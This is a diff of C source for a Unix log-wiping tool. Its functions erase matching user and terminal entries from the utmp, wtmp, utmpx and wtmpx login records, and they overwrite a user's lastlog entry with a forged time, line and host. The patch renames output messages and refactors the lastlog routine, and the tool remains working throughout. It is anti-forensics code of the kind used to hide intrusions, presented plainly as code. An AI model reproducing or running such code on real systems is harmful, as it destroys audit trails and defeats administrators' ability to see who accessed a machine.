@@ -159,7 +159,7 @@ void wipe_utmp(char *name, char *line)
 			continue;
 		if (line && strncmp(ut.ut_line, line, sizeof(ut.ut_line)))
 			continue;
-		printf("erasing: id='%.*s' name='%.*s' line='%.*s'\n",
+		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
 			(int) sizeof(ut.ut_id), ut.ut_id,
 			(int) sizeof(ut.ut_name), ut.ut_name,
 			(int) sizeof(ut.ut_line), ut.ut_line);
@@ -188,7 +188,7 @@ void wipe_utmpx(char *name, char *line)
 			continue;
 		if (line && strncmp(utx.ut_line, line, sizeof(utx.ut_line)))
 			continue;
-		printf("erasing: id='%.*s' name='%.*s' line='%.*s'\n",
+		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
 			(int) sizeof(utx.ut_id), utx.ut_id,
 			(int) sizeof(utx.ut_name), utx.ut_name,
 			(int) sizeof(utx.ut_line), utx.ut_line);
@@ -218,7 +218,7 @@ void wipe_wtmp(char *name, char *line)
 			goto skip;
 		if (line && strncmp(ut.ut_line, line, sizeof(ut.ut_line)))
 			goto skip;
-		printf("erasing: id='%.*s' name='%.*s' line='%.*s'\n",
+		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
 			(int) sizeof(ut.ut_id), ut.ut_id,
 			(int) sizeof(ut.ut_name), ut.ut_name,
 			(int) sizeof(ut.ut_line), ut.ut_line);
@@ -251,7 +251,7 @@ void wipe_wtmpx(char *name, char *line)
 			goto skip;
 		if (line && strncmp(utx.ut_line, line, sizeof(utx.ut_line)))
 			goto skip;
-		printf("erasing: id='%.*s' name='%.*s' line='%.*s'\n",
+		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
 			(int) sizeof(utx.ut_id), utx.ut_id,
 			(int) sizeof(utx.ut_name), utx.ut_name,
 			(int) sizeof(utx.ut_line), utx.ut_line);
@@ -266,40 +266,18 @@ skip:
 #endif
 }
 
-
-/*
- * LASTLOG editing.
- */
-#ifdef HAVE_LASTLOG
-void
-wipe_lastlog(char *who, char *line, char *timestr, char *host)
+void wipe_lastlog(char *name, char *line, char *timestr, char *host)
 {
-	int		fd1;
-	struct lastlog	ll;
-	struct passwd	*pwd;
-	struct tm	tm;
+#ifdef HAVE_LASTLOG
+	int fd;
+	struct lastlog ll;
+	struct passwd *pw;
+	struct tm tm;
 
-	printf("Patching %s .... ", LASTLOG_FILE);
-	fflush(stdout);
-
-        /*
-	 * Open the lastlog file.
-	 */
-	if ((fd1 = open(LASTLOG_FILE, O_RDWR)) < 0) {
-		fprintf(stderr, "fatal: could not open %s: %m\n", LASTLOG_FILE);
+	if ((pw = getpwnam(name)) == NULL) {
+		fprintf(stderr, "fatal: could not find user '%s'\n", name);
 		return;
 	}
-
-	if ((pwd = getpwnam(who)) == NULL) {
-		fprintf(stderr, "fatal: could not find user '%s'\n", who);
-		return;
-	}
-
-	lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0);
-	bzero((char *) &ll, sizeof(ll));
-
-	if (line)
-		strncpy(ll.ll_line, line, strlen(line));
 
 	if (timestr) {
 		char *r = strptime(timestr, "%Y%m%d%H%M", &tm);
@@ -310,19 +288,29 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 			fprintf(stderr, "fatal: garbage after datetime: '%s'\n", r);
 			return;
 		}
-		ll.ll_time = mktime(&tm);
 	}
 
+	printf("zeroing: uid=%u\n", pw->pw_uid);
+
+	bzero(&ll, sizeof(ll));
+	if (timestr)
+		ll.ll_time = mktime(&tm);
+	if (line)
+		strncpy(ll.ll_line, line, sizeof(ll.ll_line));
 	if (host)
 		strncpy(ll.ll_host, host, sizeof(ll.ll_host));
 
-	write(fd1, (char *) &ll, sizeof(ll));
+	if ((fd = open(LASTLOG_FILE, O_RDWR)) < 0) {
+		fprintf(stderr, "fatal: could not open %s: %m\n", LASTLOG_FILE);
+		return;
+	}
 
-	close(fd1);
+	lseek(fd, pw->pw_uid * sizeof(ll), SEEK_CUR);
+	write(fd, &ll, sizeof(ll));
 
-	printf("Done.\n");
-}
+	close(fd);
 #endif
+}
 
 
 #ifndef NO_ACCT
